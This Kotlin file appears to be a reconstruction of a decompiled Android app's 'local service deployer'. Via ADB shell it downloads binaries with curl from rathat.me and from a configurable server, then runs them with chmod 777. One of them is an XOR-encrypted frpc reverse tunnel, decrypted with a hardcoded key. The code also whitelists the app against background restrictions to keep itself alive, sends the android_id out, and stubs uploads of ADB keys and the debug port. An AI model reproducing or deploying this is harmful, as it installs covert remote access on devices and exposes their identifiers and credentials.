package com.storm.safe.rock.service.modules.setup.deploy

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.service.modules.setup.adb.AdbShellExecutor
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Local service deployment manager.
 * JADX: C0360a2 — deployLocalService (X, L2681), postDeployInit (c41 case4, L2784),
 * deployFrpcBinary (m212050d8, L2835), setupKeepAliveWhitelist (c4, L2056),
 * notifyLocalServiceConfig (L3680), postToLocalService (c8, L4949),
 * uploadAdbKeys (L4790), uploadDebugPort (l1, L4820), buildAdbConfigJson (L2043)
 */
class LocalServiceDeployer(
    private val context: Context,
    private val shellExecutor: AdbShellExecutor
) {
    companion object {
        private const val TAG = "LocalServiceDeployer"
        private const val LOCAL_SERVICE_URL = "http://127.0.0.1:7912"
        private const val TIMEOUT_MS = 5000
        private const val SVC = "/data/local/tmp/local-service"
        private const val FRPC = "/data/local/tmp/frpc"
        private const val FILE_CHECK = "if [ -f %s ]; then echo \"File exists\"; else echo \"File does not exist\"; fi"
    }

    /** vendor: f53840c5 */
    val isLocalServiceAlive = AtomicBoolean(false)
    /** vendor: f53839c4 */
    var cachedLocalIp: String = "127.0.0.1"

    /** vendor: X (L2681-2778) — deploy local-service binary */
    fun deployLocalService(debugPort: Int): Boolean {
        if (debugPort <= 0) { Log.w(TAG, "X(): invalid port $debugPort"); return false }
        Log.d(TAG, "X(): ${cachedLocalIp}:$debugPort")
        try {
            if (isLocalServiceAlive.get()) return true
            val check = shellExecutor.executeShellCommand(FILE_CHECK.format(SVC))
            val exists = check?.contains("File exists") == true
            val notExists = check?.contains("File does not exist") == true

            if (exists) {
                val ps = shellExecutor.executeShellCommand("ps -ef | grep local-service")
                val running = ps?.contains("local-service server") == true &&
                    !(ps.trim().endsWith("grep local-service"))
                if (running) { isLocalServiceAlive.set(true); postDeployInit(debugPort); return true }
                shellExecutor.executeAndCheck("chmod 777 $SVC")
                shellExecutor.fireAndForget()
                postDeployInit(debugPort); return true
            }
            if (!notExists && !exists) { Log.w(TAG, "X(): cannot detect file"); return false }

            // Copy from nativeLibraryDir
            val nativeLibDir = context.applicationInfo.nativeLibraryDir
            if (!nativeLibDir.isNullOrEmpty()) {
                val soPath = "$nativeLibDir/liblocal-service.so"
                if (File(soPath).exists() &&
                    shellExecutor.executeAndCheck("cp -f $soPath $SVC") &&
                    shellExecutor.executeAndCheck("chmod 777 $SVC")) {
                    shellExecutor.fireAndForget(); postDeployInit(debugPort); return true
                }
            }
            // Fallback: network download
            val abi = Build.SUPPORTED_ABIS?.firstOrNull() ?: "armeabi"
            shellExecutor.executeShellCommand(
                "curl -o $SVC.tmp -L 'https://rathat.me/lib/$abi/local-service' && mv $SVC.tmp $SVC && chmod 777 $SVC"
            )
            val verify = shellExecutor.executeShellCommand(FILE_CHECK.format(SVC))
            if (verify?.contains("File exists") == true) {
                shellExecutor.fireAndForget(); postDeployInit(debugPort); return true
            }
            Log.e(TAG, "X(): download failed"); return false
        } catch (e: Exception) { Log.e(TAG, "X() exception", e); return false }
    }

    /** vendor: c41 case 4 (L2784-2834) — post-deploy init in background thread */
    fun postDeployInit(debugPort: Int) {
        Thread {
            try {
                for (i in 1..10) {
                    Thread.sleep(1000L)
                    if (postToLocalService("/noticeAlive", "{}") != null) {
                        isLocalServiceAlive.set(true)
                        val pkg = context.packageName
                        val overseas = context.getSharedPreferences("device_region", 0)
                            .getBoolean("is_overseas", false)
                        postToLocalService("/setAppPackage", """{"package":"$pkg","overseas":$overseas}""")
                        notifyLocalServiceConfig()
                        Thread.sleep(2000L)
                        try { postToLocalService("/applyAllOptimizations", "{}") } catch (_: Exception) {}
                        try { deployFrpcBinary() } catch (_: Exception) {}
                        return@Thread
                    }
                }
                Log.w(TAG, "postDeployInit: local-service startup timeout")
                try {
                    val log = shellExecutor.executeShellCommand("cat $SVC.log 2>&1 | tail -50")
                    if (log != null) Log.w(TAG, "startup log: $log")
                } catch (_: Exception) {}
            } catch (e: Exception) { Log.e(TAG, "postDeployInit exception", e) }
        }.apply { isDaemon = true; name = "postDeployInit"; start() }
    }

    /** vendor: m212050d8 (L2835-2888) — deploy frpc binary */
    fun deployFrpcBinary(): Boolean {
        try {
            val check = shellExecutor.executeShellCommand(FILE_CHECK.format(FRPC))
            if (check?.contains("File exists") == true) return true

            val nativeLibDir = context.applicationInfo.nativeLibraryDir
            if (!nativeLibDir.isNullOrEmpty()) {
                val soPath = "$nativeLibDir/libfrpc.so"
                if (File(soPath).exists() &&
                    shellExecutor.executeAndCheck("cp -f $soPath $FRPC") &&
                    shellExecutor.executeAndCheck("chmod 777 $FRPC")) return true
            }
            val abi = if (Build.SUPPORTED_ABIS?.firstOrNull()?.let {
                    it.contains("arm64") || it.contains("aarch64") } == true) "arm64" else "arm"
            val serverAddr = getServerAddr() ?: return false
            if (!shellExecutor.executeAndCheck("curl -k -o $FRPC.enc -L '$serverAddr/api/binary/$abi/frpc'")) return false
            val xorKey = "K9qZ-XlN7Q"
            if (!shellExecutor.executeAndCheck("cat $FRPC.enc | $SVC xordecrypt $xorKey > $FRPC 2>/dev/null")) {
                decryptFrpcViaJava(xorKey.toByteArray(Charsets.US_ASCII))
            }
            shellExecutor.executeAndCheck("rm -f $FRPC.enc")
            return shellExecutor.executeAndCheck("chmod 777 $FRPC")
        } catch (e: Exception) { Log.e(TAG, "deployFrpc exception", e); return false }
    }

    private fun decryptFrpcViaJava(key: ByteArray) {
        try {
            val encHex = shellExecutor.executeShellCommand("xxd -p $FRPC.enc | tr -d '\\n'") ?: return
            val enc = encHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
            val dec = ByteArray(enc.size) { i -> (enc[i].toInt() xor key[i % key.size].toInt()).toByte() }
            val tmp = File(context.cacheDir, "frpc.dec")
            tmp.writeBytes(dec)
            shellExecutor.executeAndCheck("cp ${tmp.absolutePath} $FRPC && chmod 777 $FRPC")
            tmp.delete()
        } catch (e: Exception) { Log.e(TAG, "decryptFrpcViaJava failed", e) }
    }

    /** vendor: inline — get server address from SharedPreferences or Settings.Global */
    fun getServerAddr(): String? {
        val sp = context.getSharedPreferences("system_optimize", 0).getString("server_addr", null)
        if (!sp.isNullOrEmpty()) return sp
        return try {
            val g = Settings.Global.getString(context.contentResolver, "debug_server_addr")
            if (!g.isNullOrEmpty()) g else null
        } catch (_: Exception) { null }
    }

    /** vendor: inline — persist server address */
    fun setServerAddr(addr: String) {
        context.getSharedPreferences("system_optimize", 0).edit().putString("server_addr", addr).apply()
    }

    /** vendor: c4 (L2056-2091) — system keep-alive whitelist via ADB shell */
    fun setupKeepAliveWhitelist() {
        try {
            val pkg = context.packageName
            val uid = context.applicationInfo.uid
            listOf(
                "cmd deviceidle whitelist +$pkg",
                "dumpsys deviceidle whitelist +$pkg",
                "am set-standby-bucket $pkg active",
                "cmd netpolicy add restrict-background-whitelist $uid",
                "cmd netpolicy add app-idle-whitelist $uid",
                "cmd appops set $pkg RUN_IN_BACKGROUND allow",
                "cmd appops set $pkg RUN_ANY_IN_BACKGROUND allow"
            ).forEach { cmd ->
                try { shellExecutor.executeShellCommand(cmd) } catch (_: Exception) {}
            }
        } catch (_: Exception) {}
    }

    /** vendor: L3680-3706 — notify local-service of server config */
    fun notifyLocalServiceConfig() {
        try {
            val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
            val serverAddr = getServerAddr() ?: ""
            postToLocalService("/setConfig", """{"deviceId":"$androidId","serverAddr":"$serverAddr","keySalt":""}""")
        } catch (e: Exception) { Log.w(TAG, "notifyConfig failed: ${e.message}") }
    }

    /** vendor: c8 (L4949-4984) — HTTP POST to local-service (127.0.0.1:7912) */
    fun postToLocalService(path: String, body: String): String? {
        return try {
            val url = java.net.URL("$LOCAL_SERVICE_URL$path")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = TIMEOUT_MS
            conn.readTimeout = TIMEOUT_MS
            conn.doOutput = true
            conn.outputStream.use { it.write(body.ifEmpty { "{}" }.toByteArray(Charsets.UTF_8)) }
            val code = conn.responseCode
            val resp = if (code == 200) conn.inputStream.bufferedReader().use { it.readText() }
            else conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "HTTP $code"
            conn.disconnect()
            resp
        } catch (e: Exception) { Log.w(TAG, "$path: ${e.message}"); null }
    }

    /** vendor: L4790-4819 — upload ADB keys to server */
    fun uploadAdbKeys(keyDir: File?): Boolean {
        if (keyDir == null || !keyDir.exists()) return false
        val cert = File(keyDir, "cert.pem")
        val key = File(keyDir, "private.key")
        if (!cert.exists() || !key.exists()) return false
        // vendor: server URL depends on dqtvuisjd — currently unresolvable
        Log.w(TAG, "uploadAdbKeys: cannot obtain server address")
        return false
    }

    /** vendor: l1 (L4820-4846) — upload debug port to server */
    fun uploadDebugPort(port: Int): Boolean {
        if (port <= 0) return false
        val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
        Log.d(TAG, "uploadDebugPort: ip=$cachedLocalIp port=$port id=$androidId")
        // vendor: server URL depends on dqtvuisjd — currently unresolvable
        return false
    }

    /** vendor: L2043-2046 — build ADB config JSON */
    fun buildAdbConfigJson(paired: Boolean, debugPort: Int): String {
        val id = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
        return """{"paired":$paired,"updateTime":${System.currentTimeMillis()},"deviceId":"$id","debugPort":$debugPort}"""
    }
}
